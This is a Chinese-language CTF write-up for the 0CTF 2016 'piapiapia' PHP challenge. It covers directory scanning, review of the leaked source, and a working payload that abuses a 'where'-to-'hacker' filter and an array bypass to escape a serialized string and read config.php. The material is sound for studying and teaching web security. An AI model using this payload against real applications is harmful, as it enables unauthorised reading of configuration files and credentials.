---
title: '[0CTF 2016]piapiapia 1'
categories:
  - 
tags: []
abbrlink: 7285d1ac
date: 2026-03-07 14:12:24
---
# [0CTF 2016]piapiapia

# 1

# 

尝试过sql和其他东西，发现没思路

dirsearch扫描，这里如果扫描速度太快可以换下面的

./ctf_high.txt这个字典是我自己总结的，你们可以去网上找或让ai给你总结

```
python dirsearch.py -u "http://cf7016da-d794-496a-ab9b-669958940227.node5.buuoj.cn:81/" -t 1 -d 5 --full-url -R 5 -w ./ctf_high.txt
```

![image-20260129202021496](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260129202021496.png)

www.zip打开下载了一个文件夹

之前在另外一道题目有了解过这个www.zip

![image-2170920260129202300.png](/images/image-2170920260129202300.png)

那么接下来进入代码审议环节

![image-20260129202726505](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260129202726505.png)

精简一下代码

```

C:\Users\21709\Desktop\www\config.php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
//明白目标：读取config.php





C:\Users\21709\Desktop\www\update.php
		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);
		//这里name的值随便写，反正md5之后都是32位
		
		$user->update_profile($username, serialize($profile));
		//profile被序列化储存了
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';





C:\Users\21709\Desktop\www\profile.php
$profile = unserialize($profile);
//profile又被反序列化拿出来了
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']))
		//看到file_get_contents，我们只要让photo改成我们想要读取的文件config.php即可
		所以我们要在上传序列化的profile中做一些小修改
		
		
	
		
C:\Users\21709\Desktop\www\class.php		
		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
		//这里提供一种修改思路：where->hacker,5->6,数据流篡改（反序列化字符串逃逸）
```

## 构造思路

正常的版本

```
a:4:{s:5:"phone";s:11:"123";s:5:"email";s:3:"a@a";s:8:"nickname";s:5:"admin";s:5:"photo";s:10:"upload/1.jpg";}
```

我们需要在photo前面的nickname的值塞入一堆东西，这样能让我们的`";}s:5:"photo";s:10:"config.php";}`(34个)变成下一条指令解析

但是这里别忘记对于nickname的过滤：只能是字母数字，还有长度限制

```
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');
```

考虑数组绕过：

数组在preg_match的筛选下会返回值 false（字数ok，内容也全是字母）从而绕过检查，但是serialize仍然会处理它。

### 对nickname的构造

nick[]=34个where->把想要被解析的指令挤出去

```
nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```



## 解题

### 

千万要注意：我们需要先登录才能上传profile，

那么登陆之前肯定要注册，但主页是没有注册的按钮的

还记得register.php吗，打开注册就行

登陆后填入信息，然后抓包改数据，上传成功后再打开profile页面查看源代码，再解码就ok

![image-20260130141530790](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130141530790.png)



![image-20260130141339424](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130141339424.png)